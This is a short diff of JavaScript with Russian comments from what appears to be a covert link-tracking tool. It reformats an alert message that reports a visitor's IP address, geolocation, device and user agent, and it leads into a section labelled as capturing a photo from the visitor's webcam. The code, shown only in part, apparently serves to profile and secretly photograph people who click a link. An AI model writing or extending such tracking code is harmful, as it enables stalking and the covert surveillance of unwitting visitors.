@@ -40,17 +40,14 @@
     }
 
     // ---------- 4. Формирование caption (древовидный стиль) ----------
-    const caption = `🚨Новый переход по ссылке!
+    const caption = `🚨<b>Новый переход по ссылке</b>!
 
-🌐<b>IP:</b> <code>${ipAddress}</code>
- ├─🌍<b>Геолокация:</b>
-        ├─<b>Страна:</b> <code>${geoData.country_name}</code>
-        ├─<b>Регион:</b> <code>${geoData.region}</code>
-        └─<b>Город:</b> <code>${geoData.city}</code>
- └─🕗<b>Время:</b> <code>${timeStr}</code>
+🌐<b>IP Адресс</b>: ${ipAddress}
+ ├─🌍<b>Гео</b>: ${geo}
+ └─🕗<b>Время</b>: ${timeStr}
 
-📞<b>Устройство:</b> <code>${deviceType}</code>
- └─🖥<b>User-Agent:</b> <code>${shortUA}`;<code>
+📞<b>Устройство</b>: ${deviceType}
+ └─🖥<b>UserAgent</b>: ${shortUA}`;
 
     // ---------- 5. Захват фото с вебкамеры ----------
     let photoBlob = null;
